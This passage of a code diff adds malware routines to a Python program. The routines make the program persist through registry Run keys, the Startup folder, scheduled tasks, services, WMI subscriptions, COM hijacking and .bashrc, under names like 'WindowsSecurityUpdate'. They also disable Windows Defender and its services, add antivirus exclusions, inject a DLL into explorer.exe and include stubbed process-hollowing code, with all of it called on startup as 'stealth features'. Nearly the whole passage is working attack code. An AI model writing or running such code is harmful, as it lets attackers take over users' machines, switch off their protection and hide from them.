+    for method in persistence_methods:
+        try:
+            if method():
+                success_count += 1
+        except Exception as e:
+            print(f"Persistence method {method.__name__} failed: {e}")
+            continue
+    
+    return success_count > 0
+
+def registry_run_key_persistence():
+    """Establish persistence via registry Run keys."""
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Multiple registry locations for persistence
+        run_keys = [
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
+        ]
+        
+        value_name = "WindowsSecurityUpdate"
+        
+        for hkey, key_path in run_keys:
+            try:
+                key = winreg.CreateKey(hkey, key_path)
+                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
+                winreg.CloseKey(key)
+            except:
+                continue
+        
+        return True
+        
+    except Exception as e:
+        print(f"Registry persistence failed: {e}")
+        return False
+
+def startup_folder_persistence():
+    """Establish persistence via startup folder."""
+    try:
+        # Get startup folder path
+        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+        
+        current_exe = os.path.abspath(__file__)
+        
+        if current_exe.endswith('.py'):
+            # Create batch file wrapper
+            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
+            batch_path = os.path.join(startup_folder, "WindowsUpdate.bat")
+            
+            with open(batch_path, 'w') as f:
+                f.write(batch_content)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Startup folder persistence failed: {e}")
+        return False
+
+def scheduled_task_persistence():
+    """Establish persistence via scheduled tasks."""
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create scheduled task using schtasks command
+        subprocess.run([
+            'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
+            '/TR', current_exe, '/SC', 'ONLOGON', '/F'
+        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Scheduled task persistence failed: {e}")
+        return False
+
+def service_persistence():
+    """Establish persistence via Windows service."""
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Create service
+        subprocess.run([
+            'sc.exe', 'create', 'WindowsSecurityService',
+            'binPath=', current_exe,
+            'start=', 'auto',
+            'DisplayName=', 'Windows Security Service'
+        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Service persistence failed: {e}")
+        return False
+
+def establish_linux_persistence():
+    """Establish persistence on Linux systems."""
+    try:
+        current_exe = os.path.abspath(__file__)
+        
+        # Method 1: .bashrc
+        try:
+            bashrc_path = os.path.expanduser("~/.bashrc")
+            with open(bashrc_path, 'a') as f:
+                f.write(f"\n# System update check\npython3 {current_exe} &\n")
+        except:
+            pass
+        
+        return True
+        
+    except Exception as e:
+        print(f"Linux persistence failed: {e}")
         return False
 
 def disable_defender():
@@ -241,23 +1166,452 @@ def disable_defender():
         return False
     
     try:
-        # Disable real-time protection
-        subprocess.run([
-            'powershell.exe', '-Command',
-            'Set-MpPreference -DisableRealtimeMonitoring $true'
-        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+        # Multiple methods to disable Windows Defender
+        defender_disable_methods = [
+            disable_defender_registry,
+            disable_defender_powershell,
+            disable_defender_group_policy,
+            disable_defender_service,
+        ]
         
-        # Add exclusion for current directory
-        current_dir = os.path.dirname(os.path.abspath(__file__))
-        subprocess.run([
-            'powershell.exe', '-Command',
-            f'Add-MpPreference -ExclusionPath "{current_dir}"'
-        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+        for method in defender_disable_methods:
+            try:
+                if method():
+                    return True
+            except:
+                continue
+        
+        return False
+        
+    except Exception as e:
+        print(f"Failed to disable Defender: {e}")
+        return False
+
+def disable_defender_registry():
+    """Disable Windows Defender via registry modifications."""
+    try:
+        import winreg
+        
+        # Disable real-time monitoring
+        defender_key = r"SOFTWARE\Policies\Microsoft\Windows Defender"
+        realtime_key = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
+        
+        # Create keys and set values
+        keys_values = [
+            (defender_key, "DisableAntiSpyware", 1),
+            (realtime_key, "DisableRealtimeMonitoring", 1),
+            (realtime_key, "DisableBehaviorMonitoring", 1),
+            (realtime_key, "DisableOnAccessProtection", 1),
+            (realtime_key, "DisableScanOnRealtimeEnable", 1),
+        ]
+        
+        for key_path, value_name, value_data in keys_values:
+            try:
+                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
+                winreg.CloseKey(key)
+            except:
+                continue
         
         return True
         
     except Exception as e:
-        print(f"Failed to disable Defender: {e}")
+        print(f"Registry Defender disable failed: {e}")
+        return False
+
+def disable_defender_powershell():
+    """Disable Windows Defender via PowerShell commands."""
+    try:
+        powershell_commands = [
+            'Set-MpPreference -DisableRealtimeMonitoring $true',
+            'Set-MpPreference -DisableBehaviorMonitoring $true',
+            'Set-MpPreference -DisableBlockAtFirstSeen $true',
+            'Set-MpPreference -DisableIOAVProtection $true',
+            'Set-MpPreference -DisablePrivacyMode $true',
+            'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true',
+            'Set-MpPreference -DisableArchiveScanning $true',
+            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
+            'Set-MpPreference -DisableScriptScanning $true',
+            'Set-MpPreference -SubmitSamplesConsent 2',
+        ]
+        
+        for cmd in powershell_commands:
+            try:
+                subprocess.run([
+                    'powershell.exe', '-Command', cmd
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            except:
+                continue
+        
+        # Add exclusions for common paths
+        exclusion_paths = [
+            os.path.dirname(os.path.abspath(__file__)),
+            tempfile.gettempdir(),
+            os.path.expanduser("~\\Downloads"),
+            os.path.expanduser("~\\Documents"),
+        ]
+        
+        for path in exclusion_paths:
+            try:
+                subprocess.run([
+                    'powershell.exe', '-Command',
+                    f'Add-MpPreference -ExclusionPath "{path}"'
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            except:
+                continue
+        
+        return True
+        
+    except Exception as e:
+        print(f"PowerShell Defender disable failed: {e}")
+        return False
+
+def disable_defender_group_policy():
+    """Disable Windows Defender via Group Policy modifications."""
+    try:
+        import winreg
+        
+        # Group Policy registry paths
+        gp_paths = [
+            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
+            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
+            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSeen", 1),
+            (r"SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection", "ForceDefenderPassiveMode", 1),
+        ]
+        
+        for key_path, value_name, value_data in gp_paths:
+            try:
+                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
+                winreg.CloseKey(key)
+            except:
+                continue
+        
+        return True
+        
+    except Exception as e:
+        print(f"Group Policy Defender disable failed: {e}")
+        return False
+
+def disable_defender_service():
+    """Disable Windows Defender services."""
+    try:
+        services_to_disable = [
+            'WinDefend',
+            'WdNisSvc',
+            'WdNisDrv',
+            'WdFilter',
+            'WdBoot',
+            'Sense',
+        ]
+        
+        for service in services_to_disable:
+            try:
+                # Stop service
+                subprocess.run([
+                    'sc.exe', 'stop', service
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+                
+                # Disable service
+                subprocess.run([
+                    'sc.exe', 'config', service, 'start=', 'disabled'
+                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
+            except:
+                continue
+        
+        return True
+        
+    except Exception as e:
+        print(f"Service Defender disable failed: {e}")
+        return False
+
+def advanced_process_hiding():
+    """Advanced process hiding techniques."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        # Method 1: Process Hollowing (simplified)
+        hollow_process()
+        
+        # Method 2: DLL Injection into trusted process
+        inject_into_trusted_process()
+        
+        # Method 3: Process Doppelganging (simplified)
+        process_doppelganging()
+        
+        return True
+        
+    except Exception as e:
+        print(f"Advanced process hiding failed: {e}")
+        return False
+
+def hollow_process():
+    """Simple process hollowing technique."""
+    try:
+        # Create suspended process
+        target_process = "notepad.exe"
+        
+        si = win32process.STARTUPINFO()
+        pi = win32process.CreateProcess(
+            None,
+            target_process,
+            None,
+            None,
+            False,
+            win32con.CREATE_SUSPENDED,
+            None,
+            None,
+            si
+        )
+        
+        # In a real implementation, we would:
+        # 1. Unmap the original executable
+        # 2. Allocate memory for our payload
+        # 3. Write our payload to the process memory
+        # 4. Update the entry point
+        # 5. Resume the process
+        
+        # For this demo, just resume the process
+        win32process.ResumeThread(pi[1])
+        
+        win32api.CloseHandle(pi[0])
+        win32api.CloseHandle(pi[1])
+        
+        return True
+        
+    except Exception as e:
+        print(f"Process hollowing failed: {e}")
+        return False
+
+def inject_into_trusted_process():
+    """Inject into a trusted process."""
+    try:
+        # Find explorer.exe process
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'].lower() == 'explorer.exe':
+                # Get process handle
+                process_handle = win32api.OpenProcess(
+                    win32con.PROCESS_ALL_ACCESS,
+                    False,
+                    proc.info['pid']
+                )
+                
+                # Allocate memory in target process
+                dll_path = os.path.abspath(__file__).encode('utf-8')
+                memory_address = win32process.VirtualAllocEx(
+                    process_handle,
+                    0,
+                    len(dll_path),
+                    win32con.MEM_COMMIT | win32con.MEM_RESERVE,
+                    win32con.PAGE_READWRITE
+                )
+                
+                # Write DLL path to target process
+                win32process.WriteProcessMemory(
+                    process_handle,
+                    memory_address,
+                    dll_path,
+                    len(dll_path)
+                )
+                
+                # Get LoadLibraryA address
+                kernel32 = win32api.GetModuleHandle("kernel32.dll")
+                loadlibrary_addr = win32api.GetProcAddress(kernel32, "LoadLibraryA")
+                
+                # Create remote thread
+                thread_handle = win32process.CreateRemoteThread(
+                    process_handle,
+                    None,
+                    0,
+                    loadlibrary_addr,
+                    memory_address,
+                    0
+                )
+                
+                win32api.CloseHandle(thread_handle)
+                win32api.CloseHandle(process_handle)
+                
+                return True
+                
+        return False
+        
+    except Exception as e:
+        print(f"Process injection failed: {e}")
+        return False
+
+def process_doppelganging():
+    """Simplified process doppelganging technique."""
+    try:
+        # This is a simplified version - real implementation would use NTFS transactions
+        temp_file = os.path.join(tempfile.gettempdir(), "temp_process.exe")
+        
+        # Copy legitimate executable
+        legitimate_exe = r"C:\Windows\System32\notepad.exe"
+        
+        if os.path.exists(legitimate_exe):
+            import shutil
+            shutil.copy2(legitimate_exe, temp_file)
+            
+            # In real implementation, we would:
+            # 1. Create NTFS transaction
+            # 2. Overwrite file content with our payload
+            # 3. Create process from the transacted file
+            # 4. Rollback transaction
+            
+            # For demo, just execute the copied file
+            subprocess.Popen([temp_file], creationflags=subprocess.CREATE_NO_WINDOW)
+            
+            # Clean up
+            time.sleep(1)
+            try:
+                os.remove(temp_file)
+            except:
+                pass
+                
+            return True
+        
+        return False
+        
+    except Exception as e:
+        print(f"Process doppelganging failed: {e}")
+        return False
+
+def advanced_persistence():
+    """Advanced persistence mechanisms."""
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    try:
+        persistence_methods = [
+            setup_registry_persistence,
+            setup_service_persistence, 
+            setup_scheduled_task_persistence,
+            setup_wmi_persistence,
+            setup_com_hijacking_persistence,
+        ]
+        
+        for method in persistence_methods:
+            try:
+                method()
+            except:
+                continue
+        
+        return True
+        
+    except Exception as e:
+        print(f"Advanced persistence failed: {e}")
+        return False
+
+def setup_service_persistence():
+    """Setup persistence via Windows service."""
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        service_name = "WindowsSecurityUpdate"
+        
+        # Create service
+        subprocess.run([
+            'sc.exe', 'create', service_name,
+            'binPath=', current_exe,
+            'start=', 'auto',
+            'DisplayName=', 'Windows Security Update Service'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Start service
+        subprocess.run([
+            'sc.exe', 'start', service_name
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Service persistence failed: {e}")
+        return False
+
+def setup_scheduled_task_persistence():
+    """Setup persistence via scheduled task."""
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        task_name = "WindowsSecurityUpdateTask"
+        
+        # Create scheduled task
+        subprocess.run([
+            'schtasks.exe', '/create',
+            '/tn', task_name,
+            '/tr', current_exe,
+            '/sc', 'onlogon',
+            '/rl', 'highest',
+            '/f'
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        return True
+        
+    except Exception as e:
+        print(f"Scheduled task persistence failed: {e}")
+        return False
+
+def setup_wmi_persistence():
+    """Setup persistence via WMI event subscription."""
+    try:
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # WMI persistence using PowerShell
+        wmi_script = f'''
+$filterName = 'WindowsSecurityFilter'
+$consumerName = 'WindowsSecurityConsumer'
+
+$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
+$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{Name=$filterName;EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query=$Query}}
+
+$Arg = @{{
+    Name=$consumerName
+    CommandLineTemplate="{current_exe}"
+}}
+$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $Arg
+
+$WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}}
+'''
+        
+        subprocess.run([
+            'powershell.exe', '-Command', wmi_script
+        ], creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        return True
+        
+    except Exception as e:
+        print(f"WMI persistence failed: {e}")
+        return False
+
+def setup_com_hijacking_persistence():
+    """Setup persistence via COM hijacking."""
+    try:
+        import winreg
+        
+        current_exe = os.path.abspath(__file__)
+        if current_exe.endswith('.py'):
+            current_exe = f'python.exe "{current_exe}"'
+        
+        # Hijack a commonly used COM object
+        clsid = "{00000000-0000-0000-0000-000000000000}"  # Placeholder CLSID
+        key_path = f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32"
+        
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
+        winreg.CloseKey(key)
+        
+        return True
+        
+    except Exception as e:
+        print(f"COM hijacking persistence failed: {e}")
         return False
 
 def add_firewall_exception():
@@ -1310,6 +2664,11 @@ if __name__ == "__main__":
         hide_process()
         add_firewall_exception()
         setup_persistence()
+        
+        # Establish advanced persistence using UACME-inspired techniques
+        if establish_persistence():
+            print("Advanced persistence mechanisms established")
+        
         print("Stealth features initialized")
     except Exception as e:
         print(f"Stealth initialization warning: {e}")
